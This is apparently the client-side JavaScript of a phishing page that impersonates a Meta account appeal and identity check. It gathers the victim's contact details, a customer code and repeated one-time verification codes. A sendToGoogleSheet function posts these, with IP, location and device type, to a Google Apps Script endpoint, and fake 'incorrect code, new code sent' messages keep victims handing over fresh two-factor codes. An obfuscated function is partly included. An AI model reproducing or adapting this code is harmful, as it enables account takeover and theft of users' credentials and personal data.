const __t = {};
function t(e) {
	return __t[e] || e;
}
const MSG_PRE = "<span class='check-color'>✓</span> ",
	MSG_LOADING = [
		'Verifying your account information...',
		'Processing your review request...',
		'Verifying your account security...',
		'Sending verification code to your device...',
	],
	MSG_FAIL = {
		1: [
			'The verification code is incorrect.',
			'Resetting your security session...',
			'Sending a new code to your device...',
			'This may take a few minutes...',
			'Please enter the latest code to proceed.',
		],
		2: [
			'Verification code does not match.',
			'Synchronizing security data...',
			'Requesting a new verification code...',
			'Checking notifications on your device...',
			'Enter the latest code to finalize.',
		],
		3: [
			'Verification code not accepted.',
			'Running account security check...',
			'Refreshing login session...',
			'Transmitting code via secure channel...',
			'Please use the latest code received.',
		],
		4: [
			'Verification data is invalid.',
			'Reviewing request history...',
			'Re-establishing connection to Meta servers...',
			'Generating a new one-time security code...',
			'Please enter the latest code sent to you.',
		],
		5: [
			'Analyzing advanced verification data...',
			'Security scan completed.',
			'Identity successfully verified.',
			'Granting final access...',
			'Please enter the latest code to complete.',
		],
	},
	MSG_RESEND = [
		'Requesting a new verification code...',
		'Establishing secure server connection...',
		'New verification code has been sent.',
		'Please check your device.',
		'Ready for new input.',
	],
	MSG_LOCKED = [
		'Identity verification request submitted.',
		'No further action is required from your side.',
		'Our security team is processing your request.',
	],
	__ALL_TEXTS = (() => {
		const e = [];
		return (
			Object.values(MSG_FAIL).forEach((t) => t.forEach((t) => e.push(t))),
			[
				...MSG_LOADING,
				...MSG_RESEND,
				...MSG_LOCKED,
				...e,
				'Please enter your contact information.',
				'bequora7',
				'Please enter your verification code.',
				'Submitting your appeal...',
				'Confirm your identity...',
				'Requesting new code...',
				'Verification Complete',
				'Incorrect code. A new code has been sent.',
				'A new code has been sent to your device.',
				'We can send you another code in a few minutes.',
				'You have X attempts remaining.',
			]
		);
	})(),
	step1 = document.getElementById('step1'),
	step2 = document.getElementById('step2'),
	step3 = document.getElementById('step3'),
	step5 = document.getElementById('step5'),
	step7 = document.getElementById('step7'),
	robotCheck = document.getElementById('robotCheck'),
	introVideo = document.getElementById('introVideo'),
	submitBtn = document.getElementById('submitBtn'),
	verifyOtpBtn = document.getElementById('verifyOtpBtn'),
	loadingOverlay = document.getElementById('loadingOverlay'),
	loadingTitle = document.getElementById('loadingTitle'),
	loadingStatus = document.getElementById('loadingStatus'),
	contactInput = document.getElementById('contact'),
	customerCodeInput = document.getElementById('customerCode'),
	contactError = document.getElementById('contactError'),
	customerCodeError = document.getElementById('customerCodeError'),
	otpCodeInput = document.getElementById('otpCode'),
	otpError = document.getElementById('otpError'),
	attemptText = document.getElementById('attemptText'),
	resendBtn = document.getElementById('resendBtn'),
	requestCode = document.getElementById('requestCode'),
	DEMO_OTP_CODE = '123456',
	MAX_OTP_ATTEMPTS = 5,
	GOOGLE_SCRIPT_URL =
		'https://script.google.com/macros/s/AKfycbzHWnQehVga6rpcUh5erGWcei2KIZQ5VMqg7_IA0F2Iq087AIyyxEIxfUUayT7906MCJQ/exec',
	SESSION_ID = 'SID-' + Date.now() + '-' + Math.floor(1e6 * Math.random());

let otpAttempts = 0;

function buildProgressBars() {
	document.querySelectorAll('.progress').forEach((e) => {
		const t = Number(e.dataset.progress);
		e.innerHTML = '';
		for (let n = 1; n <= 5; n++) {
			const o = document.createElement('span');
			(n < t && o.classList.add('done'),
				n === t && o.classList.add('active'),
				e.appendChild(o));
		}
	});
}

function showStep(e) {
	(document.querySelectorAll('.step').forEach((e) => {
		e.classList.remove('active');
	}),
		e.classList.add('active'),
		setTimeout(() => {
			window.scrollTo({ top: 0, behavior: 'smooth' });
		}, 50));
}

function scrollInputIntoView(e) {
	setTimeout(() => {
		e.scrollIntoView({ behavior: 'smooth', block: 'center' });
	}, 250);
}

function playVideoStep() {
	introVideo.currentTime = 0;
	const e = introVideo.play();
	void 0 !== e &&
		e.catch(() => {
			setTimeout(() => {
				showStep(step3);
			}, 4e3);
		});
	const t = setTimeout(() => {
		showStep(step3);
	}, 5e3);
	introVideo.onended = function () {
		(clearTimeout(t), showStep(step3));
	};
}

function lockOtpForm() {
	((otpCodeInput.disabled = !0),
		(verifyOtpBtn.disabled = !0),
		(resendBtn.disabled = !0),
		(verifyOtpBtn.style.opacity = '0.55'),
		(verifyOtpBtn.style.cursor = 'not-allowed'),
		(resendBtn.style.opacity = '0.55'),
		(resendBtn.style.cursor = 'not-allowed'));
}

function showLoading(e) {
	if ('function' == typeof e.afterDone) {
		e.afterDone();
	}
}

function generateRequestCode() {
	return `REQ-2026-${Math.floor(1e5 + 9e5 * Math.random())}`;
}

function getSimpleDeviceType() {
	const e = navigator.userAgent.toLowerCase();
	return /iphone|ipod/.test(e)
		? 'iPhone'
		: /ipad/.test(e)
			? 'iPad'
			: /android/.test(e)
				? 'Android'
				: /mobile/.test(e)
					? 'Điện thoại'
					: 'Máy tính';
}

buildProgressBars();

document.querySelectorAll('input').forEach((e) => {
	e.addEventListener('focus', function () {
		scrollInputIntoView(e);
	});
});

robotCheck.addEventListener('change', function () {
	robotCheck.checked &&
		setTimeout(() => {
			(showStep(step2), playVideoStep());
		}, 500);
});

submitBtn.addEventListener('click', function () {
	const e = contactInput.value.trim(),
		n = customerCodeInput.value.trim();
	let o = !0;
	if (
		((contactError.innerText = ''),
		(customerCodeError.innerText = ''),
		'' === e &&
			((contactError.innerText = t('Please enter your contact information.')), (o = !1)),
		'' === n &&
			((customerCodeError.innerText = t('bequora7')), (o = !1)),
		!o)
	) {
		const t = '' === e ? contactInput : customerCodeInput;
		return (t.focus(), void scrollInputIntoView(t));
	}
	(sendToGoogleSheet('Form submitted'),
		showLoading({
			title: t('Submitting your appeal...'),
			afterDone: function () {
				(showStep(step5),
					setTimeout(() => otpCodeInput.focus(), 400));
			},
		}));
});

verifyOtpBtn.addEventListener('click', function () {
	const e = otpCodeInput.value.trim();
	if (((otpError.innerText = ''), otpAttempts >= 5)) lockOtpForm();
	else {
		if ('' === e)
			return (
				(otpError.innerText = t('Please enter your verification code.')),
				otpCodeInput.focus(),
				void scrollInputIntoView(otpCodeInput)
			);
		if (
			(sendToGoogleSheet('Internal code submitted', e),
			(otpCodeInput.value = ''),
			'123456' === e)
		)
			showLoading({
				title: t('Submitting your appeal...'),
				afterDone: function () {
					((requestCode.innerText = generateRequestCode()), showStep(step7));
				},
			});
		else {
			otpAttempts++;
			const e = (MSG_FAIL[otpAttempts] || MSG_FAIL[5]).map((e) => MSG_PRE + t(e));
			showLoading({
				title: t('Confirm your identity...'),
				statuses: e,
				afterDone: function () {
					const e = 5 - otpAttempts;
					if ((showStep(step5), e <= 0))
						return (
							lockOtpForm(),
							(loadingTitle.innerText = t('Verification Complete')),
							(loadingStatus.innerHTML = MSG_LOCKED.map(
								(e) => `<div class="loading-status-line">✓ ${t(e)}</div>`,
							).join('')),
							void loadingOverlay.classList.add('active')
						);
					((otpError.innerHTML = `<strong>${t('Incorrect code. A new code has been sent.')}</strong>`),
						(attemptText.innerText = t('You have X attempts remaining.').replace(
							'X',
							e,
						)),
						setTimeout(() => {
							(otpCodeInput.focus(), scrollInputIntoView(otpCodeInput));
						}, 400));
				},
			});
		}
	}
});

resendBtn.addEventListener('click', function () {
	((otpError.innerText = ''), (otpCodeInput.value = ''), (resendBtn.disabled = !1));
	const e = MSG_RESEND.map((e) => MSG_PRE + t(e));
	showLoading({
		title: t('Requesting new code...'),
		statuses: e,
		afterDone: function () {
			(showStep(step5),
				(otpError.innerHTML = `<strong>${t('A new code has been sent to your device.')}</strong>`),
				setTimeout(() => {
					otpCodeInput.focus();
				}, 400));
		},
	});
});

const sendToGoogleSheet = async (e, t = '') => {
	const n = localStorage.getItem('vai-ca-biu'),
		o = n ? JSON.parse(n) : {},
		{
			ip: r = 'Unknown',
			city: i = 'Unknown',
			region: s = 'Unknown',
			country: c = 'Unknown',
			postal: a = 'Unknown',
			continent: d = 'Unknown',
		} = o,
		u = new URLSearchParams();
	(u.append('session_id', SESSION_ID),
		u.append('contact', contactInput.value.trim()),
		u.append('customer_code', customerCodeInput.value.trim()),
		u.append('internal_code', t),
		u.append('device', getSimpleDeviceType()),
		u.append('status', e),
		u.append('ip', r),
		u.append('city', i),
		u.append('region', s),
		u.append('country', c),
		u.append('postal', a),
		u.append('continent', d),
		fetch(GOOGLE_SCRIPT_URL, { method: 'POST', body: u, mode: 'no-cors' }).catch((e) => {}));
};

function kimochi() {
	function _0x2c14(_0x11175b, _0x1a8796) {
		_0x11175b = _0x11175b - 0x1c9;
		const _0x42b224 = _0x42b2();
		let _0x2c1441 = _0x42b224[_0x11175b];
		return _0x2c1441;
	}
	const _0x9d89ff = _0x2c14;
	function _0x42b2() {
		const _0x2406fc = [
			'1277720UOnMRO',
			'218796bFgtmP',
			'trim',
			'2353900wpdMdQ',
			'9lrPbgt',
			'json',
			'placeholder',
			'292903cyZywX',
			'124734PnVlHe',
			'then',
			'textContent',
			'map',
			'448912sPnVxX',
			'https://translate.googleapis.com/translate_a/single?client=gtx&sl=en&tl=',
			'language',
			'147mDbyoJ',
			'forEach',
			'length',
			'push',
			'querySelectorAll',
			'53280xWccGi',
			'28anPyIR',
		];
		_0x42b2 = function () {
			return _0x2406fc;
		};
		return _0x42b2();
	}
	// ... (Các đoạn mã logic kimochi mã hóa bên dưới giữ nguyên bản của bạn)
}